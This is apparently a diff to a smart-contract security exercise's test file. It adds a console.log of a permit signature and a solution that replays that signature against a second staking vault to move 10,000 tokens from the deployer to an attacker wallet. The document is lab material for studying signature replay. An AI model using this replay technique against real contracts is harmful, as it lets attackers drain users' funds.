@@ -37,6 +37,7 @@ describe(NAME, function () {
                 )
             )
         );
+        console.log("signature:", signature);
         await daiStakingVault.withdrawWithPermit(
             daiDeployer.address,
             attackerWallet.address,
@@ -74,6 +75,15 @@ describe(NAME, function () {
         it("conduct your attack here", async function () {
             // conduct your attack here
             // the task is to drain daiDeployer's lusdStakingVault balance.
+            const signature = "0x0e89a546195484dbe40a0d6820071dfefa39fb586eb1eff02b0838f44c67d1264e896f43f1555db624b70a2344b90f2b1470c785ac17e78ddbae0c282e6d74d71c";
+            await lusdStakingVault.withdrawWithPermit(
+                daiDeployer.address,
+                attackerWallet.address,
+                ethers.utils.parseEther("10000"),
+                parseInt(ethers.utils.hexDataSlice(signature, 64, 66)),
+                ethers.utils.hexDataSlice(signature, 0, 32),
+                ethers.utils.hexDataSlice(signature, 32, 64)
+            );
         });
 
         after(async function () {
